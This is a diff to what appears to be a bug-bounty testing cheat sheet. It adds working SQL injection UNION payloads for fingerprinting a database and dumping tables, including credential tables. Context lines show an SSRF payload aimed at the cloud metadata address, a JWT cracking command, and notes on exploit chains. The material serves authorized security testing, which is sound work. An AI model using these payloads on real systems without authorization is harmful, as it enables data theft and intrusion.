@@ -150,6 +150,21 @@ http://allowed-domain.com/redirect?to=http://169.254.169.254/
 ' UNION SELECT 'a',NULL,NULL--
 ```
 
+### Fingerprint + Prove Readable Data (read-only PoC)
+```sql
+-- pick DBMS by stack: .asp/IIS→MSSQL, .php→MySQL, Java/Python→PG/Oracle
+-- column count first:  ' ORDER BY 1--  ↑ until error = N-1 cols
+0' UNION SELECT NULL,'MARKER',NULL--               -- find a displayable column
+-- fingerprint + identity (ONE readable value = valid finding):
+0' UNION SELECT NULL,@@version,NULL--              -- MSSQL/MySQL
+0' UNION SELECT NULL,version(),NULL--              -- PostgreSQL
+0' UNION SELECT NULL,SYSTEM_USER,NULL--            -- MSSQL (current_user / USER() elsewhere)
+-- schema walk + one-request dump of a sensitive table:
+0' UNION SELECT NULL,TABLE_NAME,NULL FROM INFORMATION_SCHEMA.TABLES--   -- MySQL/MSSQL/PG (Oracle: ALL_TABLES)
+-- MySQL GROUP_CONCAT() · MSSQL/PG STRING_AGG() · Oracle LISTAGG()  → dump in one request
+```
+Reading a credentials/config table is a valid standalone finding — submit on data, not a 500. (DB→OS escalation only if the DB user is sysadmin/superuser AND host exec is in scope.)
+
 ### Blind SQLi (time-based confirmation)
 ```sql
 # MySQL
@@ -273,7 +288,7 @@ token = f"{header}.{payload}."
 hashcat -a 0 -m 16500 jwt.txt ~/wordlists/rockyou.txt
 ```
 
-> **Non-JWT encrypted session cookies / ViewState / opaque auth blobs?** If decoded length is a multiple of 8 or 16 and a 1-byte flip returns HTTP 500, test for CBC padding oracle — see web2-vuln-classes section 23 (Padding Oracle & Crypto Misuse) for PadBuster recipe and ViewState-to-RCE chain.
+> **Non-JWT encrypted session cookies / ViewState / opaque auth blobs?** If decoded length is a multiple of 8 or 16 and a 1-byte flip returns HTTP 500, test for CBC padding oracle — see web2-vuln-classes **Padding Oracle & Crypto Misuse** for PadBuster recipe and ViewState-to-RCE chain.
 
 ### OAuth Attacks
 ```bash
@@ -1271,7 +1286,7 @@ Missing CSP / HSTS / X-Frame-Options / other security headers
 Missing SPF / DKIM / DMARC
 GraphQL introspection alone (no auth bypass, no IDOR)
 Banner / version disclosure without a working CVE exploit
-Clickjacking on non-sensitive pages (no sensitive action in PoC) — for working overlay PoC against sensitive action, see web2-vuln-classes section 22 (CSS Injection)
+Clickjacking on non-sensitive pages (no sensitive action in PoC) — for working overlay PoC against sensitive action, see web2-vuln-classes **CSS Injection**
 Tabnabbing
 CSV injection (no actual code execution shown)
 CORS wildcard (*) without credential exfil PoC
@@ -1302,7 +1317,7 @@ These are valid ONLY when combined with a chain that proves real impact:
 | Standalone Finding | Chain Required | Result if Chained |
 |---|---|---|
 | Open redirect | + OAuth code theft via redirect_uri abuse | ATO (Critical) |
-| Clickjacking | + sensitive action + working PoC (not just login) — see web2-vuln-classes section 22 for opacity-overlay template | Medium |
+| Clickjacking | + sensitive action + working PoC (not just login) — see web2-vuln-classes **CSS Injection** for the opacity-overlay template | Medium |
 | CORS wildcard | + credentialed request exfils user data | High |
 | CSRF | + sensitive action (transfer funds, change email) | High |
 | Rate limit bypass | + OTP/token brute force succeeding | Medium/High |
